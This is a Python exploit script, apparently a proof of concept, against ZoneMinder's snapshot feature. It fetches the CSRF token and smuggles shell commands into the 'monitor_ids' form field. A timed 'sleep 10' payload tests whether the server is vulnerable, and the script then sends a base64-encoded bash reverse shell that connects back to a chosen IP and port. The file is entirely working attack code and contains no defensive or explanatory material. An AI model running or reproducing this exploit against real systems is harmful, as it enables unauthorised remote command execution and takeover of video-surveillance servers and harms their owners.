import time
import base64
from bs4 import BeautifulSoup
from http.client import HTTPSConnection, HTTPConnection
from urllib.parse import urlencode, urlparse
from typing import Union

class ZoneminderSnapshots:
    def __init__(self, url: str, local_ip: str, local_port: str) -> None:
        self.connection = self.get_connection_type(url)
        self.headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.reverse_shell = self.encode_command_to_base64(f'bash -i >& /dev/tcp/{local_ip}/{local_port}  0>&1')
    
    @staticmethod
    def get_connection_type(url: str) -> Union[HTTPConnection, HTTPSConnection]:
        parsed_url = urlparse(url)

        if parsed_url.scheme == 'http':
            return HTTPConnection(parsed_url.netloc)
        elif parsed_url.scheme == 'https':
            return HTTPSConnection(parsed_url.netloc)
        
    @staticmethod
    def encode_command_to_base64(command: str) -> str:
        encoded_command = base64.b64encode(command.encode('ascii')).decode()
        equals_count = encoded_command.count('=')

        if equals_count >= 1:
            encoded_command = base64.b64encode(f'{command + " " * equals_count}'.encode('ascii')).decode()

        return encoded_command
        
    def get_csrf_token(self) -> str:
        self.connection.request('GET', '/index.php')

        response = self.connection.getresponse()
        html_content = response.read().decode('utf-8')
        response.close()

        return BeautifulSoup(html_content, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value')

    def send_payload(self, payload: str) -> None:
        data = {
            'view': 'snapshot',
            'action': 'create',
            'monitor_ids[0][Id]': f'0;{payload}',
            '__csrf_magic': f'{self.get_csrf_token()}'
        }

        self.connection.request('POST', '/index.php', body=urlencode(data), headers=self.headers)

    def check_vulnerable(self) -> bool:
        initial_time = time.time()

        self.send_payload('sleep 10')
        response = self.connection.getresponse()

        final_time = time.time()

        response.close()

        if (final_time - initial_time) < 10:
            return False

        return True
    
    def inject_reverse_shell(self) -> None:
        self.send_payload(f'echo "{self.reverse_shell}" | base64 -d | bash')
        self.connection.close()